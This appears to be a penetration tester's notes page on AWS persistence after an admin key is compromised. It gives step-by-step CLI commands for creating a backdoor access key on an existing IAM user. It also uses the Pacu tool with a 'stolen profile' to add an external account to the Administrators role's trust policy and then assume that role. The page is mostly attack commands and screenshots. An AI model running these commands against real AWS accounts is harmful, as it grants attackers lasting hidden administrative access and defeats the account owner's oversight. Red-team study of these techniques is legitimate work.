# AWS

## AWS Persistence technique

* AWS IAM user can have 2 access keys
  * Admin access can add second key for other users
  * An alert is triggered in case of key replacement \(avoid 2keys user ...\)
* trust relationship \(**temp creds to access a resource**\)
  * sts:AssumeRole depending on policies, a user can make a temp credential request to get access to a user and/or a resource
  * Definied in IAM policy \(1hour lifespan\)

![](../../../../.gitbook/assets/10ca94c1847b45168dffd105d2ed03fb.png)

### 

### Backdoor an AWS account

After compromising admin key, we can add a key to an existing account.

* **list iam users**

```csharp
aws iam list-users --profile Admin
```

![](../../../../.gitbook/assets/14820c66c74b4107b5005b15dc09c8bb.png)

* **list users key \(one key user\)**

```csharp
aws iam list-access-keys --user-name BackupAdmin --profile Admin
```

![](../../../../.gitbook/assets/12065357fb154f92ab4898d5301a9df6.png)

* **Create a new access key on the target account**

```csharp
aws iam create-access-key --user-name BackupAdmin --profile Admin
```

![](../../../../.gitbook/assets/530825ef9de94eb6bf6e08e9f7985762.png)

* **List keys**

![](../../../../.gitbook/assets/62f7fc662cba4b0e8d1d2f967ce1f1d4.png)

* **Configure a session for the backdoored account and access AWS** 

```csharp
aws sts get-caller-identity --profile BackupAdmin
```

![](../../../../.gitbook/assets/3b4ce16ab03e4c1b8f4ef3d0122c70eb.png)

### External user - Cross account Persistence

* Create a trust relationship with an entity outide the AWS account
* Retrieve your extenal ARN value

```csharp
aws sts get-caller-identity --profile testuser
```

![](../../../../.gitbook/assets/693ab30f94384c94a1e585eb611d922f.png)

* Launch pacu and import stolen profile key

![](../../../../.gitbook/assets/bc6021a0c4a14e7287f6877eada3b0bc.png)

![](../../../../.gitbook/assets/c4c7d603b61c4c4ca01446d7a85c2d58.png)

* Enumerate users-roles

```csharp
run iam__enum_users_roles_policies_groups
```

![](../../../../.gitbook/assets/b4348006b5af457a8cb331c9a6e4db5e.png)

```csharp
run iam__enum_permissions whoami
```

![](../../../../.gitbook/assets/24b0f054fb6b428e91198b726ebffe6d.png)

* Backdoor the account using the external one

```csharp
run iam__backdoor_assume_role --role-names Administrators --user-arns arn:aws:redacted
```

![](../../../../.gitbook/assets/aad75fc87cc5439fbe7f2667bd2018b7.png)

* Check roles \(backdoored must be in now\)

```csharp
aws iam get-role --role-name Administrators --profile StolenProfile
```

![](../../../../.gitbook/assets/828b4e2eff3945c1b356e1002072f92f.png)

```csharp
aws sts assume-role --role-arn arn:aws:iam::REDACTED:role/Administrators --role-session-name test --profile testuser
```

### Resource

{% embed url="https://github.com/RhinoSecurityLabs/pacu" %}

